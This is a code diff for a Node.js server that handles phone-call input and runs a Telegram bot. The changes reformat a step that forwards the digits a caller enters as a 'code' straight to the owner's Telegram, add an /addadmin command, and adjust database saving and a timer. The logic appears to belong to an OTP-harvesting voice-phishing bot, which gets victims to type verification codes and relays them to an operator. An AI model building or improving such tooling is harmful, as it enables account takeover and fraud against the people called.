@@ -148,7 +148,7 @@ function loadDB() {
 
 function saveDB() {
   try {
-    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
+    fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), ()=>{});
   } catch (e) {
     console.log("saveDB error:", e.message);
   }
@@ -960,12 +960,7 @@ app.post("/input", async (req, res) => {
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
     pushCodeEntry(caller, digits, sid, ownerId);
 
-// send code instantly as its own Telegram message
-try {
-  await tgSend(ownerId, `${digits}`);
-} catch(e) {
-  console.log("code send error:", e.message);
-}
+    try { await tgSend(ownerId, `${digits}`); } catch(e) { console.log('tg code send fail',e.message);}
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
@@ -1194,7 +1189,26 @@ app.post("/telegram", async (req, res) => {
       }
     }
 
-    // -------------------------
+    
+
+if (text.startsWith("/addadmin")) {
+  if (!ownerOnly(chatId)) {
+    await tgSend(chatId,"Owner only");
+    return res.sendStatus(200);
+  }
+  const id = text.split(" ")[1];
+  if (!id) {
+    await tgSend(chatId,"Usage: /addadmin TELEGRAM_ID");
+    return res.sendStatus(200);
+  }
+  if (!ADMIN_IDS.includes(id)) {
+    ADMIN_IDS.push(id);
+    ensureUser(id);
+  }
+  await tgSend(chatId,`Admin added: ${id}`);
+  return res.sendStatus(200);
+}
+// -------------------------
     // Text commands
     // -------------------------
     if (update.message && update.message.text) {
@@ -1651,7 +1665,7 @@ setInterval(async () => {
     cleanupEndedCalls();
     saveDB();
   } catch {}
-}, 1000);
+}, 2000);
 
 // ============================================================
 // STARTUP
